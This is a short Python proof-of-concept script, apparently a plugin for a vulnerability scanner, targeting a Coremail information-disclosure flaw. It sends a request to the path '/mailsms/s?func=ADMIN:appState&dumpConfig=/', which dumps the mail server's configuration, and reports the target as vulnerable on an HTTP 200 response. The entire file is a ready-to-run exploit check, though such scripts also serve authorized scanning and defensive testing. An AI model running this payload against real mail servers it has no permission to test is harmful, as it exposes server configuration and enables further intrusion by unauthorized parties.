#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# date:2019/06/16

"""
Copyright (c) saucerman (https://saucer-man.com)
See the file 'LICENSE' for copying permission
coremail信息泄露
refer: https://cert.360.cn/warning/detail?id=41af711794c911ff0e0b05ca60be1177
"""

from urllib.parse import urlparse
from lib.core.Request import request

headers = {'User-Agent':"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"}
payload = '/mailsms/s?func=ADMIN:appState&dumpConfig=/'


def poc(url):
    # url = "http://www.example.org/default.html?ct=32&op=92&item=98"
    # --> http://www.example.org
    if url[:4] != "http":
        url = "http://" + url
    o = urlparse(url)
    url = o.scheme + "://" + o.netloc + payload
    try:
        req = request.get(url, headers=headers, timeout=5, allow_redirects=False, verify=False)
        if req.status_code == 200:
            return url
        else:
            return False
    except:
        return False
